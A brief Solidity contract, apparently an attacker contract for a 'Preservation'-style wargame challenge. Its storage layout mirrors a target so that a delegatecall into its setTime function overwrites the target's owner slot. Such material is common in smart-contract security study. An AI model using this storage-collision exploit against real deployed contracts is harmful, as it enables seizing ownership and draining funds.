// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
contract PreservationPerversion {
    uint256 public placeholder1;
    uint256 public placeholder2;
    address public owner;
    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}